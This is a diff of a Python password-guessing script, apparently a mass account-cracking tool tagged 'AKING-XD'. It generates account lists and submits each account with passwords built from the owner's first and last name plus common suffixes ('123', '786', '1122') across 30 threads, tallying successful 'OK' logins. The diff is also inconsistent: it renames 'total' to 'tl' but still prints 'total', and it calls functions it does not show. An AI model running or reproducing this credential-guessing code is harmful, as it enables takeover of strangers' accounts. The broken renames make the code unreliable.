@@ -430,7 +430,7 @@ def m1(ids,passlist):
                 loop+=1
         except Exception as e:
                 pass
-def rndm(ids,passlist):
+def m2(ids,passlist):
         global loop
         global oks
         sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
@@ -668,13 +668,13 @@ def gmail():
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
                 with tred(max_workers=30) as yaari:
-                        total = str(len(fo))
+                        tl = str(len(fo))
                         os.system('clear');print(logo)
                         print(' Total account : \033[1;32m'+total)
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
-                                ids,names = user.split('|')
+                                uid,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
                                         last_name = names.rsplit(' ')[1]
@@ -682,8 +682,8 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                yaari.submit(m1,ids,passlist)
+                                pwx = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                yaari.submit(fcrack,uid,pwx,tl)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
